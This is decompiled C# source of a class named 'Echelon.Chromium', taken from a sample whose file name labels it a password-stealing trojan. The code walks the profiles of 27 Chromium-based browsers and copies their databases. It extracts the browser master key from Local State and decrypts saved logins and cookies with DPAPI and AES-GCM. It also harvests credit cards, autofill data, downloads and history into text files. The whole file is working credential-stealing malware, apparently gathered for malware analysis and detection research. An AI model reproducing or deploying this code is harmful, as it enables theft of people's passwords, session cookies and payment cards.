// Decompiled with JetBrains decompiler
// Type: Echelon.Chromium
// Assembly: Echelon, Version=2.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DAEC4C03-F667-4BBB-B546-ED8351172E13
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan-PSW.MSIL.Coins.gen-d5a7c67747c1d8095b6fb6fef9f446b048a753bfda98e9cf19f265a6203e27cf.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;

namespace Echelon
{
  internal class Chromium
  {
    public static int Passwords = 0;
    public static int Autofills = 0;
    public static int Downloads = 0;
    public static int Cookies = 0;
    public static int History = 0;
    public static int CC = 0;
    private static readonly string bd = Path.GetTempPath() + "\\bd" + Help.HWID + ".tmp";
    private static readonly string ls = Path.GetTempPath() + "\\ls" + Help.HWID + ".tmp";
    private static readonly string[] BrowsersName = new string[27]
    {
      "Chrome",
      "Edge",
      "Yandex",
      "Orbitum",
      "Opera",
      "Amigo",
      "Torch",
      "Comodo",
      "CentBrowser",
      "Go!",
      "uCozMedia",
      "Rockmelt",
      "Sleipnir",
      "SRWare Iron",
      "Vivaldi",
      "Sputnik",
      "Maxthon",
      "AcWebBrowser",
      "Epic Browser",
      "MapleStudio",
      "BlackHawk",
      "Flock",
      "CoolNovo",
      "Baidu Spark",
      "Titan Browser",
      "Google",
      "browser"
    };

    public static void GetPasswords(string path2save)
    {
      try
      {
        List<string> stringList1 = new List<string>();
        List<string> stringList2 = new List<string>();
        stringList2.Add(Help.AppDate);
        stringList2.Add(Help.LocalData);
        List<string> stringList3 = new List<string>();
        foreach (string path in stringList2)
        {
          try
          {
            stringList3.AddRange((IEnumerable<string>) Directory.GetDirectories(path));
          }
          catch
          {
          }
        }
        foreach (string path1 in stringList3)
        {
          string[] strArray1 = (string[]) null;
          string contents = "";
          try
          {
            stringList1.AddRange((IEnumerable<string>) Directory.GetFiles(path1, "Login Data", SearchOption.AllDirectories));
            strArray1 = Directory.GetFiles(path1, "Login Data", SearchOption.AllDirectories);
          }
          catch
          {
          }
          if (strArray1 != null)
          {
            foreach (string path2 in strArray1)
            {
              try
              {
                if (File.Exists(path2))
                {
                  string str1 = "Unknown";
                  foreach (string str2 in Chromium.BrowsersName)
                  {
                    if (path1.Contains(str2))
                      str1 = str2;
                  }
                  string sourceFileName1 = path2;
                  string sourceFileName2 = path2 + "\\..\\..\\Local State";
                  if (File.Exists(Chromium.bd))
                    File.Delete(Chromium.bd);
                  if (File.Exists(Chromium.ls))
                    File.Delete(Chromium.ls);
                  File.Copy(sourceFileName1, Chromium.bd);
                  string ls = Chromium.ls;
                  File.Copy(sourceFileName2, ls);
                  SqlHandler sqlHandler = new SqlHandler(Chromium.bd);
                  List<PassData> passDataList = new List<PassData>();
                  sqlHandler.ReadTable("logins");
                  string str3 = File.ReadAllText(Chromium.ls);
                  string[] strArray2 = Regex.Split(str3, "\"");
                  int num = 0;
                  foreach (string str4 in strArray2)
                  {
                    if (str4 == "encrypted_key")
                    {
                      str3 = strArray2[num + 2];
                      break;
                    }
                    ++num;
                  }
                  byte[] key = DecryptAPI.DecryptBrowsers(Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(str3)).Remove(0, 5)));
                  int rowCount = sqlHandler.GetRowCount();
                  for (int rowNum = 0; rowNum < rowCount; ++rowNum)
                  {
                    try
                    {
                      string s = sqlHandler.GetValue(rowNum, 5);
                      byte[] bytes = Encoding.Default.GetBytes(s);
                      string str5 = "";
                      try
                      {
                        if (s.StartsWith("v10") || s.StartsWith("v11"))
                        {
                          byte[] array = ((IEnumerable<byte>) bytes).Skip<byte>(3).Take<byte>(12).ToArray<byte>();
                          str5 = AesGcm256.Decrypt(((IEnumerable<byte>) bytes).Skip<byte>(15).ToArray<byte>(), key, array);
                        }
                        else
                          str5 = Encoding.Default.GetString(DecryptAPI.DecryptBrowsers(bytes));
                      }
                      catch
                      {
                      }
                      contents = contents + "Url: " + sqlHandler.GetValue(rowNum, 1) + "\r\n";
                      contents = contents + "Login: " + sqlHandler.GetValue(rowNum, 3) + "\r\n";
                      contents = contents + "Passwords: " + str5 + "\r\n";
                      contents = contents + "Browser: " + str1 + "\r\n\r\n";
                      ++Chromium.Passwords;
                    }
                    catch
                    {
                    }
                  }
                  File.Delete(Chromium.bd);
                  File.Delete(Chromium.ls);
                  if (str1 == "Unknown")
                    File.AppendAllText(path2save + "\\Passwords_" + str1 + ".txt", contents);
                  else
                    File.WriteAllText(path2save + "\\Passwords_" + str1 + ".txt", contents);
                }
              }
              catch
              {
              }
            }
          }
        }
      }
      catch
      {
      }
    }

    public static void GetCookies(string path2save)
    {
      try
      {
        List<string> stringList1 = new List<string>();
        List<string> stringList2 = new List<string>();
        stringList2.Add(Help.AppDate);
        stringList2.Add(Help.LocalData);
        List<string> stringList3 = new List<string>();
        foreach (string path in stringList2)
        {
          try
          {
            stringList3.AddRange((IEnumerable<string>) Directory.GetDirectories(path));
          }
          catch
          {
          }
        }
        foreach (string path1 in stringList3)
        {
          string contents = "";
          string[] strArray1 = (string[]) null;
          try
          {
            stringList1.AddRange((IEnumerable<string>) Directory.GetFiles(path1, "Cookies", SearchOption.AllDirectories));
            strArray1 = Directory.GetFiles(path1, "Cookies", SearchOption.AllDirectories);
          }
          catch
          {
          }
          if (strArray1 != null)
          {
            foreach (string path2 in strArray1)
            {
              try
              {
                if (File.Exists(path2))
                {
                  string str1 = "Unknown";
                  foreach (string str2 in Chromium.BrowsersName)
                  {
                    if (path1.Contains(str2))
                      str1 = str2;
                  }
                  string sourceFileName1 = path2;
                  string sourceFileName2 = path2 + "\\..\\..\\Local State";
                  if (File.Exists(Chromium.bd))
                    File.Delete(Chromium.bd);
                  if (File.Exists(Chromium.ls))
                    File.Delete(Chromium.ls);
                  File.Copy(sourceFileName1, Chromium.bd);
                  string ls = Chromium.ls;
                  File.Copy(sourceFileName2, ls);
                  SqlHandler sqlHandler = new SqlHandler(Chromium.bd);
                  List<PassData> passDataList = new List<PassData>();
                  sqlHandler.ReadTable("cookies");
                  string str3 = File.ReadAllText(Chromium.ls);
                  string[] strArray2 = Regex.Split(str3, "\"");
                  int num = 0;
                  foreach (string str4 in strArray2)
                  {
                    if (str4 == "encrypted_key")
                    {
                      str3 = strArray2[num + 2];
                      break;
                    }
                    ++num;
                  }
                  byte[] key = DecryptAPI.DecryptBrowsers(Encoding.Default.GetBytes(Encoding.Default.GetString(Convert.FromBase64String(str3)).Remove(0, 5)));
                  int rowCount = sqlHandler.GetRowCount();
                  for (int rowNum = 0; rowNum < rowCount; ++rowNum)
                  {
                    try
                    {
                      string s = sqlHandler.GetValue(rowNum, 12);
                      byte[] bytes = Encoding.Default.GetBytes(s);
                      try
                      {
                        string str5;
                        if (s.StartsWith("v10"))
                        {
                          byte[] array = ((IEnumerable<byte>) bytes).Skip<byte>(3).Take<byte>(12).ToArray<byte>();
                          str5 = AesGcm256.Decrypt(((IEnumerable<byte>) bytes).Skip<byte>(15).ToArray<byte>(), key, array);
                        }
                        else
                          str5 = Encoding.Default.GetString(DecryptAPI.DecryptBrowsers(bytes));
                        string str6 = sqlHandler.GetValue(rowNum, 1);
                        string str7 = sqlHandler.GetValue(rowNum, 2);
                        string str8 = sqlHandler.GetValue(rowNum, 4);
                        string str9 = sqlHandler.GetValue(rowNum, 5);
                        string str10 = sqlHandler.GetValue(rowNum, 6);
                        contents += string.Format("{0}\tFALSE\t{1}\t{2}\t{3}\t{4}\t{5}\r\n", (object) str6, (object) str8, (object) str10.ToUpper(), (object) str9, (object) str7, (object) str5);
                        ++Chromium.Cookies;
                      }
                      catch
                      {
                      }
                    }
                    catch
                    {
                    }
                  }
                  File.Delete(Chromium.bd);
                  File.Delete(Chromium.ls);
                  if (str1 == "Unknown")
                    File.AppendAllText(path2save + "\\Cookies_" + str1 + ".txt", contents);
                  else
                    File.WriteAllText(path2save + "\\Cookies_" + str1 + ".txt", contents);
                }
              }
              catch
              {
              }
            }
          }
        }
      }
      catch
      {
      }
    }

    public static void GetCards(string path2save)
    {
      try
      {
        List<string> stringList1 = new List<string>();
        List<string> stringList2 = new List<string>();
        stringList2.Add(Help.AppDate);
        stringList2.Add(Help.LocalData);
        List<string> stringList3 = new List<string>();
        foreach (string path in stringList2)
        {
          try
          {
            stringList3.AddRange((IEnumerable<string>) Directory.GetDirectories(path));
          }
          catch
          {
          }
        }
        foreach (string path1 in stringList3)
        {
          string contents = "";
          string[] strArray = (string[]) null;
          try
          {
            stringList1.AddRange((IEnumerable<string>) Directory.GetFiles(path1, "Web Data", SearchOption.AllDirectories));
            strArray = Directory.GetFiles(path1, "Web Data", SearchOption.AllDirectories);
          }
          catch
          {
          }
          if (strArray != null)
          {
            foreach (string path2 in strArray)
            {
              try
              {
                if (File.Exists(path2))
                {
                  string str1 = "Unknown";
                  foreach (string str2 in Chromium.BrowsersName)
                  {
                    if (path1.Contains(str2))
                      str1 = str2;
                  }
                  string sourceFileName = path2;
                  if (File.Exists(Chromium.bd))
                    File.Delete(Chromium.bd);
                  string bd = Chromium.bd;
                  File.Copy(sourceFileName, bd);
                  SqlHandler sqlHandler = new SqlHandler(Chromium.bd);
                  List<PassData> passDataList = new List<PassData>();
                  sqlHandler.ReadTable("credit_cards");
                  int rowCount = sqlHandler.GetRowCount();
                  for (int rowNum = 0; rowNum < rowCount; ++rowNum)
                  {
                    try
                    {
                      string str3 = Encoding.UTF8.GetString(DecryptAPI.DecryptBrowsers(Encoding.Default.GetBytes(sqlHandler.GetValue(rowNum, 4))));
                      string str4 = sqlHandler.GetValue(rowNum, 1);
                      string str5 = sqlHandler.GetValue(rowNum, 2);
                      string str6 = sqlHandler.GetValue(rowNum, 3);
                      string str7 = sqlHandler.GetValue(rowNum, 9);
                      contents += string.Format("{0}\t{1}/{2}\t{3}\t{4}\r\n******************************\r\n", (object) str4, (object) str5, (object) str6, (object) str3, (object) str7);
                      ++Chromium.CC;
                    }
                    catch
                    {
                    }
                  }
                  File.Delete(Chromium.bd);
                  File.Delete(Chromium.ls);
                  if (str1 == "Unknown")
                    File.AppendAllText(path2save + "\\CC_" + str1 + ".txt", contents);
                  else
                    File.WriteAllText(path2save + "\\CC_" + str1 + ".txt", contents);
                }
              }
              catch
              {
              }
            }
          }
        }
      }
      catch
      {
      }
    }

    public static void GetAutofills(string path2save)
    {
      try
      {
        List<string> stringList1 = new List<string>();
        List<string> stringList2 = new List<string>();
        stringList2.Add(Help.AppDate);
        stringList2.Add(Help.LocalData);
        List<string> stringList3 = new List<string>();
        foreach (string path in stringList2)
        {
          try
          {
            stringList3.AddRange((IEnumerable<string>) Directory.GetDirectories(path));
          }
          catch
          {
          }
        }
        foreach (string path1 in stringList3)
        {
          string contents = "";
          string[] strArray = (string[]) null;
          try
          {
            stringList1.AddRange((IEnumerable<string>) Directory.GetFiles(path1, "Web Data", SearchOption.AllDirectories));
            strArray = Directory.GetFiles(path1, "Web Data", SearchOption.AllDirectories);
          }
          catch
          {
          }
          if (strArray != null)
          {
            foreach (string path2 in strArray)
            {
              try
              {
                if (File.Exists(path2))
                {
                  string str1 = "Unknown";
                  foreach (string str2 in Chromium.BrowsersName)
                  {
                    if (path1.Contains(str2))
                      str1 = str2;
                  }
                  string sourceFileName = path2;
                  if (File.Exists(Chromium.bd))
                    File.Delete(Chromium.bd);
                  string bd = Chromium.bd;
                  File.Copy(sourceFileName, bd);
                  SqlHandler sqlHandler = new SqlHandler(Chromium.bd);
                  List<PassData> passDataList = new List<PassData>();
                  sqlHandler.ReadTable("autofill");
                  int rowCount = sqlHandler.GetRowCount();
                  for (int rowNum = 0; rowNum < rowCount; ++rowNum)
                  {
                    try
                    {
                      string str3 = sqlHandler.GetValue(rowNum, 0);
                      string str4 = sqlHandler.GetValue(rowNum, 1);
                      contents += string.Format("Name: {0}\r\nValue: {1}\r\n----------------------------\r\n", (object) str3, (object) str4);
                      ++Chromium.Autofills;
                    }
                    catch
                    {
                    }
                  }
                  File.Delete(Chromium.bd);
                  File.Delete(Chromium.ls);
                  if (str1 == "Unknown")
                    File.AppendAllText(path2save + "\\Autofills_" + str1 + ".txt", contents);
                  else
                    File.WriteAllText(path2save + "\\Autofills_" + str1 + ".txt", contents);
                }
              }
              catch
              {
              }
            }
          }
        }
      }
      catch
      {
      }
    }

    public static void GetDownloads(string path2save)
    {
      try
      {
        List<string> stringList1 = new List<string>();
        List<string> stringList2 = new List<string>();
        stringList2.Add(Help.AppDate);
        stringList2.Add(Help.LocalData);
        List<string> stringList3 = new List<string>();
        foreach (string path in stringList2)
        {
          try
          {
            stringList3.AddRange((IEnumerable<string>) Directory.GetDirectories(path));
          }
          catch
          {
          }
        }
        foreach (string path1 in stringList3)
        {
          string[] strArray = (string[]) null;
          try
          {
            stringList1.AddRange((IEnumerable<string>) Directory.GetFiles(path1, "History", SearchOption.AllDirectories));
            strArray = Directory.GetFiles(path1, "History", SearchOption.AllDirectories);
          }
          catch
          {
          }
          if (strArray != null)
          {
            foreach (string path2 in strArray)
            {
              string contents = "";
              try
              {
                if (File.Exists(path2))
                {
                  string str1 = "Unknown (" + path1 + ")";
                  foreach (string str2 in Chromium.BrowsersName)
                  {
                    if (path1.Contains(str2))
                      str1 = str2;
                  }
                  string sourceFileName = path2;
                  if (File.Exists(Chromium.bd))
                    File.Delete(Chromium.bd);
                  string bd = Chromium.bd;
                  File.Copy(sourceFileName, bd);
                  SqlHandler sqlHandler = new SqlHandler(Chromium.bd);
                  List<PassData> passDataList = new List<PassData>();
                  sqlHandler.ReadTable("downloads");
                  int rowCount = sqlHandler.GetRowCount();
                  for (int rowNum = 0; rowNum < rowCount; ++rowNum)
                  {
                    try
                    {
                      string str3 = sqlHandler.GetValue(rowNum, 3);
                      string str4 = sqlHandler.GetValue(rowNum, 15);
                      contents += string.Format("URL: {0}\r\nPath: {1}\r\n----------------------------\r\n", (object) str4, (object) str3);
                      ++Chromium.Downloads;
                    }
                    catch
                    {
                    }
                  }
                  File.Delete(Chromium.bd);
                  File.WriteAllText(path2save + "\\" + str1 + "_Downloads.txt", contents);
                }
              }
              catch
              {
              }
            }
          }
        }
      }
      catch
      {
      }
    }

    public static void GetHistory(string path2save)
    {
      try
      {
        List<string> stringList1 = new List<string>();
        List<string> stringList2 = new List<string>();
        stringList2.Add(Help.AppDate);
        stringList2.Add(Help.LocalData);
        List<string> stringList3 = new List<string>();
        foreach (string path in stringList2)
        {
          try
          {
            stringList3.AddRange((IEnumerable<string>) Directory.GetDirectories(path));
          }
          catch
          {
          }
        }
        foreach (string path1 in stringList3)
        {
          string contents = "";
          string[] strArray = (string[]) null;
          try
          {
            stringList1.AddRange((IEnumerable<string>) Directory.GetFiles(path1, "History", SearchOption.AllDirectories));
            strArray = Directory.GetFiles(path1, "History", SearchOption.AllDirectories);
          }
          catch
          {
          }
          if (strArray != null)
          {
            foreach (string path2 in strArray)
            {
              try
              {
                if (File.Exists(path2))
                {
                  string str1 = "Unknown";
                  foreach (string str2 in Chromium.BrowsersName)
                  {
                    if (path1.Contains(str2))
                      str1 = str2;
                  }
                  string sourceFileName = path2;
                  if (File.Exists(Chromium.bd))
                    File.Delete(Chromium.bd);
                  string bd = Chromium.bd;
                  File.Copy(sourceFileName, bd);
                  SqlHandler sqlHandler = new SqlHandler(Chromium.bd);
                  List<PassData> passDataList = new List<PassData>();
                  sqlHandler.ReadTable("urls");
                  int rowCount = sqlHandler.GetRowCount();
                  for (int rowNum = 0; rowNum < rowCount; ++rowNum)
                  {
                    try
                    {
                      string str3 = sqlHandler.GetValue(rowNum, 1);
                      string str4 = sqlHandler.GetValue(rowNum, 2);
                      contents += string.Format("\r\nTitle: {0}\r\nUrl: {1}", (object) str4, (object) str3);
                      ++Chromium.History;
                    }
                    catch
                    {
                    }
                  }
                  File.Delete(Chromium.bd);
                  if (str1 == "Unknown")
                    File.AppendAllText(path2save + "\\History_" + str1 + ".txt", contents, Encoding.Default);
                  else
                    File.WriteAllText(path2save + "\\History_" + str1 + ".txt", contents, Encoding.Default);
                }
              }
              catch
              {
              }
            }
          }
        }
      }
      catch
      {
      }
    }
  }
}
